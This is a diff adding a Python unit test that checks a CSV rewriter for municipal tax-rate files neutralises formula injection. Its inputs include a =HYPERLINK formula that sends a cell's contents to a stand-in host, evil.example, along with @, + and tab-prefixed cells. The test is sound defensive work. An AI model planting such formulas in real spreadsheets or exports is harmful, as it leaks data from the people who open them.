@@ -1089,6 +1089,15 @@ class FileChecks(HomeCase):
         kept, _ = inbox.check_files(self.folder({"aliquotas-iss-2026.csv": csv_rows(80, ";")}), self.BODY)
         self.assertIn("\r\nCidade 1;1,0;https://www.gov.example/1\r\n", kept[0]["content"])
 
+    def test_no_cell_runs_as_a_formula(self):
+        text = inbox.rewrite_csv('municipio,aliquota,fonte\nSP,2%,"=HYPERLINK(""https://evil.example/?d=""&A1)"\n'
+                                 'RJ,-5,@SUM(1+1)\nBH,+2.5%,"\tcmd"\nPOA,-1.234,5,+x\n')
+        rows = [line.split(";") for line in text.lstrip("\ufeff").split("\r\n") if line]
+        self.assertEqual(rows[1], ["SP", "2%", "\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1)\""])
+        self.assertEqual(rows[2], ["RJ", "-5", "'@SUM(1+1)"])
+        self.assertEqual(rows[3], ["BH", "+2.5%", "'\tcmd"])
+        self.assertEqual(rows[4], ["POA", "-1.234", "5", "'+x"])
+
     def test_what_is_dropped(self):
         big = "x" * (inbox.FILE_MAX_BYTES + 1)
         files = {"aliquotas-iss-2026.csv": csv_rows(3), "Notas.md": "y" * 2000, "nao-citado-2026.md": "z\n" * 1000,
